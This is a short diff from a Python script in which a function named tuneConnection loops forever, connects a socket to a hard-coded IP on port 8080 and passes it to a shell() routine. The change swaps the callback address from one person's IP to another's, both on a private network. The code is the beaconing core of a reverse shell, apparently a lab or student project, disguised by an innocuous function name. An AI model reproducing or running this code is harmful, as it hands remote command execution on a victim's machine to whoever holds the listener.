@@ -21,7 +21,8 @@ def tuneConnection():
     while True:
         time.sleep(5)
         try:
-            mySocket.connect(("192.168.21.128", 8080))  # Insert IP address here
+            # mySocket.connect(("192.168.21.128", 8080))  # Insert IP address here LEIGHTON IP
+            mySocket.connect(("192.168.20.1", 8080))  # Insert IP address here QUINN IP
             shell(mySocket)
 
         except:
